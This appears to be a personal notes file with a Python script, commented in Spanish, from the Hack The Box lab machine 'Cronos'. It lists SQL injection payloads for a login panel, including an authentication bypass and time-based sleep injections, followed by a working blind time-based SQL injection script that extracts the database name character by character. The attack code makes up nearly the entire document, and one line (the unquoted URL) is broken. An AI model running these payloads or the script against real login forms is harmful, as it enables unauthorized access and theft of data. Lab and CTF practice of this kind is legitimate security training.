#Usado en Maquina Cronos HTB

#Injecciones Sql, script Nº1

#Estando enfrente el panel de acceso

#1)  admin' or 1=1 -- -         #comentamos la password y funciona

#2) ' or sleep(5) -- -           #Jugamos con el tiempo delays y funciona, tarda 5 seg

#3) ' or if (substring(database(),1,1)='a',sleep(5),1) -- -

#4) script para sacar el numbre de la base de datos en base al tiempo:

import requests
import signal
import sys
import time

from pwn import *

def def_handler(sign, frame):
    print("\n[!] .. Saliendo .. [!]\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales

main_url = http://admin.cronos.htb

s = r'0123456789abcdefghijklmnñopqrstuvwxyz'  # variables para el bucle del user

def makeRequest():
    
    database_name = ""
                 # Barras de progreso para ver la evolucion de Payload y la tabla de basa de datos Actualizandose    
    p1 = log.progress("Payload")
    p2 = log.progress("Nombre de Base de Datos")

    for position in range(1,10):  # Jugamos con el " %d " para iterar sobre 10 letras que serian el total de caracteres de la tabla de base de dados
        for character in s:         # Jugamos con el " %c " para iterar sobre los varchar e ir Fuzzeando por todas las letras del abcdario definidas en la variable S arriba

            login_data = {
            'username' : "' or if(substr(database(),%d,1)='%c',sleep(5),1)-- -" %(position, character),
            'password' : 'admin'
            }
            p1.status(login_data)
        
            time_start = time.time()
            requests.post(main_url, data=login_data)
            time_end = time.time()    
    
            if time_end - time_start > 5:
                database_name += character
                p2.status(database_name)
                break
              

if __name__=='__main__':
    makeRequest()

